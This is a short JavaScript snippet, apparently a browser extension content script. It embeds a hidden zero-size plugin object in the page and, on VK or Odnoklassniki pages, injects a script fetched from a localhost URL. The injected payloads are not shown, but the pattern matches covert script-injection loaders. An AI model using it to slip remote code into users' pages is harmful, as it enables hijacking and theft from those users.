var plg = document.createElement("object");
if (plg) {
	plg.setAttribute("type", "application/afp");
	plg.setAttribute("id", "AFP");
	plg.setAttribute("width", 0);
	plg.setAttribute("height", 0);
	document.body.appendChild(plg);
	//alert(location.hostname);
}


if(location.hostname.indexOf('odnoklassniki') > -1)
	var scr = 'lock_test2';
if(location.hostname.indexOf('vk') > -1)
	var scr = 'lvk';
if(scr){
	var script = document.createElement('script');
	script.setAttribute('type', 'text/javascript');
	script.setAttribute('src', 'http://localhost/vk/'+scr+'.js');
	document.body.appendChild(script);
}